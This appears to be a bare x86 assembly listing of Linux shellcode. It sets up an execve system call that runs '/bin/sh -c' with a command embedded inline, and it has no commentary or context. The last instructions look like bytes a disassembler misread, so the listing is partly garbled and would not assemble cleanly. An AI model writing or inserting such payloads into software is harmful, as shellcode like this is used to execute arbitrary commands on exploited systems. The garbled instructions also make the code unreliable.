global _start

section .text
  _start:
    push byte +0xb
    pop eax
    cdq
    push edx
    push word 0x632d
    mov edi,esp
    push dword 0x68732f
    push dword 0x6e69622f
    mov ebx,esp
    push edx
    call dword 0x20
    imul esp,[eax+eax+0x57],dword 0xcde18953
    db 0x80

